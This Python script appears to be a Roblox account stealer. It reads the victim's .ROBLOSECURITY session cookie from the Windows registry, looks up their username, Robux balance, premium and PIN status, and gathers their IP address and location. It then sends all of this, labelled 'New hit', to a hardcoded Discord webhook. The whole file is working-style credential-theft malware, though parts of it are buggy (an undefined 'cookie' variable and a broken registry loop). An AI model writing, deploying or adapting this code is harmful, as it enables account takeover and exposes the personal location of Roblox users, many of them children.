
#scooby0001 made this - importing libs

import os,json,time
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
try:
    import robloxpy,requests
except:
    os.system('pip install robloxpy')
    os.system('pip install requests')
    print('Please re run the program')
    time.sleep(2)

#put your webhook here
webhook = "https://discord.com/api/webhooks/1289760399658582056/0hh1KFg6z8Ck8aGuo7UWSQj-piwldzvXfeVoG6pglPDpYWrU8rthR-veInM14ryu6NqV"
print('{ PLEASE WAIT } Loading...') 

# - dummy message , can change to anything


#ip recovery
def post():
    r = requests.get("http://ipinfo.io/json").json()
    ip = r['ip']
    c = r['city']
    co = r['country']
    r = r['region'] 
    ipinfo = {
  "content": "",
  "embeds": [
    {
      "title": "IP Found",
      "description": f"```\nIP : {ip}\nCity : {c}\nCountry : {co}\nRegion : {r}\n```",
      "color": 1341395,
      "footer": {
        "text": "scooby#0001"
      },
      "image": {
        "url": "https://media.discordapp.net/attachments/860177535010603028/1013141468484993096/unknown.png"
      }
    }
  ],
  "username": "Angel",
  "avatar_url": "https://media.discordapp.net/attachments/860177535010603028/1013141468484993096/unknown.png",
  "attachments": []
    }
    requests.post(webhook, json=ipinfo)

#try's to find the cookie in reg
def find():
    path = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    v = 0
    name, value, type = EnumValue(path, v)
    if name == ".ROBLOSECURITY":
        return value
        v += 1
rc = str(find())

#checks if cookie real (real)
if rc == '':
    requests.post(webhook, json={"username":"Angel","content":"**No cookie found :C**"})
    post()
    exit()
rcsend = rc.split("COOK::<")[1].split(">")[0]

#checks if the cookie is vaild 
try: 
    r = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":rcsend}).json()
except:
    requests.post(webhook, json={"username":"Angel","content":"**Invaild cookie found :C**"})
    post()
    exit()
strr = requests.get("https://auth.roblox.com/v1/account/pin",cookies={".ROBLOSECURITY":rcsend}).json()
pin = strr["isEnabled"]
id = r["UserID"]
username = r['UserName']
robux = r['RobuxBalance']
p = r['IsPremium']
profile = f"https://web.roblox.com/users/{id}/profile"
rolimons = f"https://www.rolimons.com/player/{id}"
headshot = robloxpy.User.External.GetHeadshot(id)
rap = robloxpy.User.External.GetRAP(id)
info = {
  "content": '',
  "embeds": [
    {
      "title": "New hit | https://discord.gg/comped",
      "color": 1341395,
      "fields": [
        {
          "name": "Username",
          "value": f"{username}",
          "inline": True
        },
        {
          "name": "Robux",
          "value": f"{robux}",
          "inline": True
        },
        {
          "name": "Premium?",
          "value": f"{p}",
          "inline": True
        },
        {
          "name": "RAP",
          "value": f"{rap}",
          "inline": True
        },
        {
          "name": "PIN?",
          "value": f"{pin}",
          "inline": True
        },
        {
          "name": "INFO",
          "value": f"[Rolimons](https://www.rolimons.com/player/{id}) | [Roblox](https://www.roblox.com/users/{id})",
          "inline": True
        },
        {
          "name": ".ROBLOSECURITY",
          "value": f"```fix\n{cookie}\n```"
        }
      ],
      "footer": {
        "text": "scooby#0001 made this shi"
      },
      "thumbnail": {
        "url": f"{headshot}"
      }
    }
  ],
  "username": "Angel",
  "avatar_url": "https://cdn.discordapp.com/attachments/818904708940693513/998008481393156096/7d3e8a23aa14956289350fbac8600754.jpg",
  "attachments": []
}
requests.post(webhook, json=info)
post()
